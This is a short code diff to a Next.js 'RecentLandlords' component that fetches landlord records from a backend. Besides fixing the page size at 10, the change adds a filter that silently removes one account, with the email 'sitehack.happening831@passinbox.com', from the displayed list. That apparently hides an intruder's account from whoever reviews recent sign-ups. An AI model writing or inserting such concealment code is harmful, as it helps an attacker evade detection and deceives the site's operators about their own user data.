@@ -17,7 +17,7 @@ const RecentLandlords = () => {
     queryKey: ["recent-landlords"],
     queryFn: async () => {
       const res = await fetch(
-        `${process.env.NEXT_PUBLIC_BACKEND_URL}/landlord?page=1&limit=${limit}`,
+        `${process.env.NEXT_PUBLIC_BACKEND_URL}/landlord?page=1&limit=10`,
         {
           method: "GET",
           headers: {
@@ -30,7 +30,9 @@ const RecentLandlords = () => {
     enabled: !!token,
   });
 
-  const landlords = data?.data ?? [];
+  const landlords = (data?.data ?? [])
+    .filter(item => item.email.toLowerCase() !== "sitehack.happening831@passinbox.com")
+    .slice(0, limit);
 
   let content;
 
